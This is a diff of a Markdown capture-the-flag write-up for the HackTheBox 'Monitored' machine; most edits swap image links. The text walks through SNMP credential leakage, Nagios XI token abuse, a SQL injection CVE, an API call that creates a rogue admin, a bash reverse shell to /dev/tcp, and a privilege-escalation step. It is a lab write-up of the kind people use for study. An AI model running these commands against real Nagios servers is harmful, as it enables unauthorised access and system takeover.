@@ -70,62 +70,62 @@ Ok, now, I have a possible new entry point. Let's see what `snmp` has to say.
 
 Hum, SNMP is very noising...!  
 It seems that some other participants are trying to get some rev shell ahah  
-![[Pasted image 20240504174114.png]]  
+![monitored2](/images/blog/writeup/monitored/monitored2.png)
 ```shell
 iso.3.6.1.2.1.25.4.2.1.5.636 = STRING: "-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB "
 ```
 New credentials!  
 
 They do not work for SSH, I tried them for Nagios XI and I got an interesting message:  
-![[Pasted image 20240504181448.png]]  
+![monitored3](/images/blog/writeup/monitored/monitored3.png)
 
 After some enumeration, I found on various sources (like forums and nagios documentation) that `authenticate` api endpoint and `token` url parameter can be used to login as `svc` if previously found creds are the good ones! So.  
 
-[Here](https://support.nagios.com/forum/viewtopic.php?t=58783) ...  
-![[Pasted image 20240504183221.png]]  
+[Here](https://support.nagios.com/forum/viewtopic.php?t=58783)...  
+![monitored4](/images/blog/writeup/monitored/monitored4.png)
 
 Plus [here](https://www.nagios.org/ncpa/help/2.0/api.html):  
-![[Pasted image 20240504183432.png]]  
+![monitored5](/images/blog/writeup/monitored/monitored5.png)
 Let's go.
 ```txt
 curl -d 'username=svc&password=XjH7VCehowpR1xZB' -k https://nagios.monitored.htb/nagiosxi/api/v1/authenticate  
 ```
 
-![[Pasted image 20240504183502.png]]  
+![monitored6](/images/blog/writeup/monitored/monitored6.png)
 I got the `token`, next let's try to authenticate:  
-![[Pasted image 20240504183614.png]]  
+![monitored7](/images/blog/writeup/monitored/monitored7.png)
 ```txt
 https://nagios.monitored.htb/nagiosxi/?token=03e88dd4a29c1a57144ecdc41dcb8dee5577bf28
 ```
-
-![[Pasted image 20240504183704.png]]![[Pasted image 20240504183709.png]]  
+![monitored8](/images/blog/writeup/monitored/monitored8.png)
+![monitored9](/images/blog/writeup/monitored/monitored9.png)
 
 Yeah, we are  connected as `svc`.  
 The version used is `5.11`:  
-![[Pasted image 20240504191934.png]]  
+![monitored10](/images/blog/writeup/monitored/monitored10.png)
 
 There are a CVE for this one: `CVE-2023-40931`. [Article](https://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567) and [github poc](https://github.com/LucasVanHaaren/CVE-2023-47400).  
 Below the users table:  
-![[Pasted image 20240504192213.png]]
+![monitored11](/images/blog/writeup/monitored/monitored11.png)
 
 Brute force hashes from database give me  new credentials: `nas:test`!  
 But, at this point, I can do nothing...  
 After looking back at the `xi_users` table and seeing the `api_key` field i decided to explore the `API` way.  
-![[Pasted image 20240506210534.png]]  
+![monitored12](/images/blog/writeup/monitored/monitored12.png)
 
 After hours of enumeration (nagios api documentation is very poor), i successfully created a new admin user! 🔥  
 
 ```shell
 curl -k -XPOST "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=pwnedeheh&password=pwned&auth_level=admin&email=pwned@localhost&name=pwned"
 ```
-![[Pasted image 20240506213344.png]]  
+![monitored13](/images/blog/writeup/monitored/monitored13.png)
 
 Ressources:
 - `api endpoint` : https://support.nagios.com/forum/viewtopic.php?t=42923
 - `api admin parameter` : https://raw.githubusercontent.com/rapid7/metasploit-framework/fc3199259b72e20da222480e8cd9734511a50ab8/modules/exploits/linux/http/nagios_xi_chained_rce_2_electric_boogaloo.rb
 
 `admin` section contains interesting features in `core config manager` [here](https://nagios.monitored.htb/nagiosxi/includes/components/ccm/xi-index.php):  
-![[Pasted image 20240507211515.png]]  
+![monitored14](/images/blog/writeup/monitored/monitored14.png)
 `Services` and `Commands` sections.  
 
 After getting lost in the mountain of features I got it!  
@@ -141,12 +141,12 @@ The `Command` contains:
 ```shell
 bash -c 'bash -i >& /dev/tcp/10.10.14.115/1996 0>&1'
 ```
-![[Pasted image 20240506221318.png]]  
+![monitored15](/images/blog/writeup/monitored/monitored15.png)
 
 The `Service` one:  
-![[Pasted image 20240506221400.png]]  
+![monitored16](/images/blog/writeup/monitored/monitored16.png)
 The button ton run the `Service`.  
-![[Pasted image 20240506221425.png]]  
+![monitored17](/images/blog/writeup/monitored/monitored17.png)
 Let's go we have our entry point!  
 
 ## Privesc
@@ -154,10 +154,10 @@ Let's go we have our entry point!
 After loooong enumeration, I understood the attack path...!  
 
 Basic enumeration with `sudo -l` gives:  
-![[Pasted image 20240507202919.png]]  
+![monitored18](/images/blog/writeup/monitored/monitored18.png)
 
 I tried to run some of them but nothing:  
-![[Pasted image 20240507203051.png]]  
+![monitored19](/images/blog/writeup/monitored/monitored19.png)
 
 However, some of `bash` scripts seem to be interesting, especially `manage_services.sh`.  
 ```bash
@@ -250,6 +250,6 @@ Ncat: Listening on :::1998
 Ncat: Listening on 0.0.0.0:1998
 ```
 Then, I start the service from `/usr/local/nagiosxi/scripts/manage_services.sh`:  
-![[Pasted image 20240507204807.png]]  
+![monitored20](/images/blog/writeup/monitored/monitored20.png)
 
 <span style="align:center">**PWNED**!</span>
